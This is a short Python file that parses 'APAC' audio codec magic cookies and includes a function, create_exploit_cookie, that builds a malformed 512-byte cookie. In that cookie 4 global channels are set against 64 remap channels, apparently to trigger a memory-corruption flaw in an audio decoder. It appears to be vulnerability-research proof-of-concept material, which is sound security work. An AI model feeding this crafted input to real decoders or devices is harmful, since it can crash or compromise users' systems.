# parser.py
from construct import Struct, Int8ub, Int16ub, Int32ub, GreedyBytes, Const
from typing import Dict

def parse_apac_cookie(data: bytes) -> Dict:
    out = {}
    out["cookie_len"] = len(data)
    
    possible = None
    for i in range(0, min(64, len(data)-2)):
        val = int.from_bytes(data[i:i+2], "big")
        if 1 <= val <= 64:
            possible = (i, val)
            break
    
    if possible:
        out["channel_field_offset"] = possible[0]
        out["channel_count"] = possible[1]
    else:
        out["channel_field_offset"] = None
        out["channel_count"] = None
    
    runs = []
    run_start = None
    for i, b in enumerate(data[:256]):
        if b < 0x40:
            if run_start is None:
                run_start = i
        else:
            if run_start is not None:
                runs.append((run_start, i-run_start))
                run_start = None
    if run_start is not None:
        runs.append((run_start, len(data[:256])-run_start))
    
    out["remap_runs"] = runs[:5]
    
    return out

def create_exploit_cookie() -> bytes:
    cookie = bytearray(512)
    
    cookie[0:4] = b"APAC"
    cookie[4:8] = (48000).to_bytes(4, "big")
    
    global_channels = 4
    remap_channels = 64
    
    cookie[58:60] = global_channels.to_bytes(2, "big")
    cookie[78:80] = remap_channels.to_bytes(2, "big")
    
    for i in range(100, 164):
        cookie[i] = (i - 100) % 256
    
    return bytes(cookie)